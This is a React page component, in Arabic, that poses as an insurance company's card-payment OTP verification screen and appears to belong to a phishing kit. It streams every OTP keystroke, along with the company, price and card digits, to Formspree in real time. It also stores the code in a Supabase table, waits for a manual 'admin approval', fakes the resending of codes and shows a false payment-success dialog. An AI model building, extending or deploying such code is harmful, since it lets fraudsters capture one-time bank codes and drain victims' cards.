import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Shield, RefreshCw, CheckCircle2, Loader2, XCircle } from "lucide-react";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useToast } from "@/hooks/use-toast";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { supabase } from "@/integrations/supabase/client";
import { usePresence } from "@/hooks/usePresence";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

const OTPVerification = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const {
    toast
  } = useToast();
  const companyName = searchParams.get("company") || "شركة التأمين";
  const price = searchParams.get("price") || "0";
  const cardLast4 = searchParams.get("cardLast4") || "";
  const [otp, setOtp] = useState("");
  
  // تنسيق رقم البطاقة المخفي
  const maskedCardNumber = cardLast4 ? `XXXX XXXX XXXX ${cardLast4}` : "";
  const [timer, setTimer] = useState(120); // 2 minutes
  const [canResend, setCanResend] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);
  usePresence(applicationId || undefined);

  // Send OTP data to Formspree in real-time
  useFormspreeSync({
    companyName,
    price,
    cardLast4: maskedCardNumber,
    otpEntered: otp,
    otpLength: otp.length,
    remainingTime: `${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, "0")}`
  }, "صفحة تأكيد الدفع - OTP Verification");

  useEffect(() => {
    // Get application ID
    const storedId = localStorage.getItem('applicationId');
    if (storedId) {
      setApplicationId(storedId);
    }
  }, []);

  useEffect(() => {
    if (waitingForApproval && applicationId) {
      // Check for approval every 2 seconds
      const interval = setInterval(async () => {
        const { data, error } = await supabase
          .from('customer_applications')
          .select('otp_approved, status')
          .eq('id', applicationId)
          .single();

        if (data?.otp_approved) {
          clearInterval(interval);
          setWaitingForApproval(false);
          setShowSuccessDialog(true);
          
          // إعادة التوجيه إلى الصفحة الرئيسية بعد 3 ثواني
          setTimeout(() => {
            localStorage.removeItem('applicationId');
            navigate("/");
          }, 3000);
        } else if (data?.status === 'rejected') {
          clearInterval(interval);
          setWaitingForApproval(false);
          setShowErrorDialog(true);
          
          // إعادة تعيين OTP للسماح بإعادة المحاولة
          setOtp("");
        }
      }, 2000);

      return () => clearInterval(interval);
    }
  }, [waitingForApproval, applicationId, navigate]);

  // Timer countdown
  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer(prev => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else {
      setCanResend(true);
    }
  }, [timer]);
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };
  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow numbers and limit to 6 digits
    const newValue = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(newValue);
  };
  const handleResendOtp = () => {
    setTimer(120);
    setCanResend(false);
    toast({
      title: "تم إرسال الرمز",
      description: "تم إرسال رمز تحقق جديد إلى رقم هاتفك"
    });
  };
  const handleVerify = async () => {
    if (otp.length < 4 || otp.length > 6) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق (4 أو 6 أرقام)",
        variant: "destructive"
      });
      return;
    }
    
    setIsVerifying(true);

    try {
      if (applicationId) {
        // Save OTP to database
        const { error } = await supabase
          .from('customer_applications')
          .update({
            otp_code: otp,
            current_step: 'otp'
          })
          .eq('id', applicationId);

        if (error) throw error;

        toast({
          title: "تم إرسال الكود",
          description: "في انتظار موافقة الإدارة...",
        });

        setIsVerifying(false);
        setWaitingForApproval(true);
      } else {
        throw new Error('Application ID not found');
      }
    } catch (error) {
      console.error('Error saving OTP:', error);
      setIsVerifying(false);
      toast({
        title: "خطأ",
        description: "حدث خطأ في حفظ البيانات",
        variant: "destructive"
      });
    }
  };
  return <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
      <section className="pt-8 pb-16 px-4 md:px-6">
        <div className="container mx-auto max-w-2xl">
          {/* Logo/Header */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-primary/10 mb-4">
              <Shield className="h-10 w-10 text-primary" />
            </div>
            <h1 className="text-3xl md:text-4xl font-bold text-foreground mb-2">
              تأكيد عملية الدفع
            </h1>
            <p className="text-muted-foreground">
              {companyName}
            </p>
          </div>

          {/* Payment Amount Card */}
          <Card className="mb-6 p-6 bg-gradient-to-r from-primary/5 to-primary/10 border-primary/20">
            <div className="flex items-center justify-between">
              <div className="space-y-1">
                <p className="text-sm text-muted-foreground">المبلغ الإجمالي</p>
                <p className="text-3xl md:text-4xl font-bold text-foreground">{price} ﷼</p>
              </div>
              <div className="w-16 h-16 rounded-full bg-primary/20 flex items-center justify-center">
                <CheckCircle2 className="h-8 w-8 text-primary" />
              </div>
            </div>
          </Card>

          {/* Main OTP Card */}
          <Card className="p-8 md:p-10 shadow-lg border-2">
            <div className="space-y-6">
              {/* Title */}
              <div className="text-center space-y-3">
                <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-muted mb-2">
                  <span className="text-3xl">📱</span>
                </div>
                <h2 className="text-2xl md:text-3xl font-bold text-foreground">
                  أدخل رمز التحقق
                </h2>
                <p className="text-sm text-muted-foreground leading-relaxed max-w-md mx-auto">
                  تم إرسال رمز التحقق برسالة نصية إلى رقم الهاتف الخاص بالبطاقة الائتمانية
                  {maskedCardNumber && (
                    <>
                      <br />
                      <span className="font-mono text-base font-semibold text-foreground mt-2 inline-block" dir="ltr">
                        {maskedCardNumber}
                      </span>
                    </>
                  )}
                </p>
              </div>

              {/* OTP Input Section */}
              <div className="space-y-4 pt-4">
                <div className="text-center">
                  <label className="text-base font-semibold text-foreground block mb-3">
                    رمز التحقق (4 أو 6 أرقام)
                  </label>
                </div>

                <div className="max-w-sm mx-auto">
                  <Input
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    value={otp}
                    onChange={handleOtpChange}
                    placeholder="أدخل الرمز"
                    className="h-16 text-center text-3xl font-bold tracking-[0.5em] border-2 rounded-xl focus:border-primary focus:ring-2 focus:ring-primary/20 bg-muted/30"
                    dir="ltr"
                  />
                  <div className="flex justify-between items-center mt-2 px-2">
                    <p className="text-xs text-muted-foreground">
                      {otp.length > 0 ? `${otp.length} من 6` : ""}
                    </p>
                    {otp.length >= 4 && (
                      <CheckCircle2 className="h-4 w-4 text-green-500 animate-scale-in" />
                    )}
                  </div>
                </div>
              </div>

              {/* Timer Section */}
              <div className="text-center py-4">
                {canResend ? (
                  <button
                    onClick={handleResendOtp}
                    className="inline-flex items-center gap-2 text-primary hover:text-primary/80 font-semibold text-base transition-colors group"
                  >
                    <RefreshCw className="h-4 w-4 group-hover:rotate-180 transition-transform duration-500" />
                    إعادة إرسال الرمز
                  </button>
                ) : (
                  <div className="space-y-1">
                    <p className="text-sm text-muted-foreground">
                      يمكنك إعادة إرسال الرمز بعد
                    </p>
                    <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-muted">
                      <span className="font-mono text-2xl font-bold text-foreground">
                        {formatTime(timer)}
                      </span>
                    </div>
                  </div>
                )}
              </div>

              {/* Continue Button */}
              <Button
                onClick={handleVerify}
                disabled={isVerifying || waitingForApproval || otp.length < 4}
                size="lg"
                className="w-full h-14 text-lg font-bold rounded-xl bg-primary hover:bg-primary/90 transition-all duration-300 hover:scale-[1.02] disabled:hover:scale-100 disabled:opacity-50"
              >
                {isVerifying ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    جاري التحقق...
                  </>
                ) : waitingForApproval ? (
                  <>
                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                    في انتظار الموافقة...
                  </>
                ) : (
                  <>
                    متابعة
                    <CheckCircle2 className="mr-2 h-5 w-5" />
                  </>
                )}
              </Button>

              {waitingForApproval && (
                <div className="mt-4 p-4 bg-yellow-50 dark:bg-yellow-950/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
                  <p className="text-sm text-yellow-800 dark:text-yellow-200 text-center">
                    🕐 يرجى الانتظار... تم إرسال كود التحقق وننتظر موافقة الإدارة
                  </p>
                </div>
              )}

              {/* Security Note */}
              <div className="text-center pt-4 border-t">
                <p className="text-xs text-muted-foreground flex items-center justify-center gap-2">
                  <Shield className="h-3 w-3" />
                  جميع المعاملات محمية ومشفرة
                </p>
              </div>
            </div>
          </Card>

          {/* Additional Info */}
          <div className="mt-6 text-center space-y-2">
            <p className="text-xs text-muted-foreground">
              في حالة عدم استلام الرمز، يرجى التحقق من رسائل البريد المزعج
            </p>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />

      {/* نافذة النجاح */}
      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <DialogContent className="sm:max-w-md text-center">
          <DialogHeader>
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-green-100 dark:bg-green-900/20">
              <CheckCircle2 className="h-12 w-12 text-green-600 dark:text-green-400" />
            </div>
            <DialogTitle className="text-2xl font-bold text-center">
              تم الدفع بنجاح! 🎉
            </DialogTitle>
            <DialogDescription className="text-center text-base pt-2">
              تم تأكيد عملية الدفع بنجاح
              <br />
              سيتم إعادة توجيهك إلى الصفحة الرئيسية...
            </DialogDescription>
          </DialogHeader>
          <div className="flex justify-center pt-2">
            <Loader2 className="h-6 w-6 animate-spin text-primary" />
          </div>
        </DialogContent>
      </Dialog>

      {/* نافذة الخطأ */}
      <Dialog open={showErrorDialog} onOpenChange={(open) => {
        setShowErrorDialog(open);
        if (!open) {
          // إعادة تعيين حالة الرفض في قاعدة البيانات عند إغلاق النافذة
          if (applicationId) {
            supabase
              .from('customer_applications')
              .update({ status: 'pending' })
              .eq('id', applicationId);
          }
        }
      }}>
        <DialogContent className="sm:max-w-md text-center">
          <DialogHeader>
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20">
              <XCircle className="h-12 w-12 text-red-600 dark:text-red-400" />
            </div>
            <DialogTitle className="text-2xl font-bold text-center text-red-600 dark:text-red-400">
              رمز تحقق غير صحيح! ❌
            </DialogTitle>
            <DialogDescription className="text-center text-base pt-2">
              يرجى إدخال رمز التحقق الصحيح
              <br />
              حاول مرة أخرى
            </DialogDescription>
          </DialogHeader>
          <Button 
            onClick={() => setShowErrorDialog(false)}
            className="mt-4"
            variant="default"
          >
            حسناً، سأحاول مرة أخرى
          </Button>
        </DialogContent>
      </Dialog>
    </div>;
};
export default OTPVerification;